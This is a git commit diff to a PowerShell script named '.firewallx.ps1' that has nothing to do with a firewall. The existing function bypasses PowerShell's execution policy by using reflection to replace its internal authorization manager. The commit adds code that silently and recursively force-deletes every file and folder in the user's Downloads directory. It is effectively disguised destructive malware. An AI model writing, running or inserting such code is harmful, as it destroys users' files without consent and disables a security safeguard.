5a70c30144ce21cb140a26b676ee159a499de58c
fxhxyz4 <fxhxyz8@gmail.com>
2025-01-27 15:41:44 +0300

    Update .firewallx.ps1

--- .firewallx.ps1
+++ .firewallx.ps1
@@ -1,5 +1,19 @@
 function Disable-ExecutionPolicy {
-        ($ctx = $executioncontext.gettype().getfield('_context','nonpublic,instance').getvalue($executioncontext)).gettype().getfield('_authorizationManager','nonpublic,instance').setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager 'Microsoft.PowerShell'))
+    ($ctx = $executioncontext.gettype().getfield('_context','nonpublic,instance').getvalue($executioncontext)).gettype().getfield('_authorizationManager','nonpublic,instance').setvalue($ctx, (new-object System.Management.Automation.AuthorizationManager 'Microsoft.PowerShell'))
 };
 
 Disable-ExecutionPolicy;
+
+$downloadsPath = [Environment]::GetFolderPath("UserProfile") + "\Downloads"
+
+if (Test-Path $downloadsPath) {
+    try {
+        Get-ChildItem -Path $downloadsPath -File -Recurse | Remove-Item -Force -ErrorAction Stop
+        Get-ChildItem -Path $downloadsPath -Directory -Recurse | Remove-Item -Recurse -Force -ErrorAction Stop
+
+    } catch {
+        Write-Error "Error: $($_.Exception.Message)"
+    }
+} else {
+    Write-Error "Directory 'Downloads' no exists"
+}
